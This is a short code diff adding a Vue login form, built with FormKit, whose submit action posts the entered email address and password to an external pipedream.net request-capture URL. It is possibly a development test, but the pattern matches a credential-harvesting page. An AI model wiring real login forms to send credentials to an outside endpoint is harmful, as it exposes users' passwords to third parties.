@@ -1,0 +1,30 @@
+<template>
+    <div>
+        <FormKit
+            type="form"
+            submit-label="Login"
+            action="https://enpae7aofyxlml7.m.pipedream.net"
+            method="post"
+        >
+        <FormKit
+        name="email"
+        label="Email address"
+        validation="required|email"
+        />
+        <FormKit
+        type="password"
+        name="password"
+        label="Password"
+        validation="required"
+        />
+  </FormKit>
+    </div>
+</template>
+
+<script setup>
+
+</script>
+
+<style scoped>
+
+</style>
